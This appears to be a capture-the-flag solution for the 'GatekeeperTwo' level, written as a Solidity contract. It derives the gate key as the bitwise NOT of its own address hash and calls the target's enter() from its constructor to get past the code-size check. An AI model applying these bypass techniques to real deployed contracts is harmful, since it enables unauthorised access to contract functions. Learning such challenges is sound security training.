// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GatekeeperTwo.sol";

contract GatekeeperTwoEntrant {
    GatekeeperTwo public gate;

    constructor() {
        gate = GatekeeperTwo(0xF628740B94Ee2CF188e277404F8dfE7dc7c01ceB);
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 b = ~a; // bitwise "not" operator, which returns the opposite binary numbers
        //we need it to be opposite so the "xor" operator would be all 1's
        bytes8 c = bytes8(b);
        gate.enter(c);
    } // we call the "enter" function inside a constructor so the contract would be deployed and the function would be called in the same transaction
}
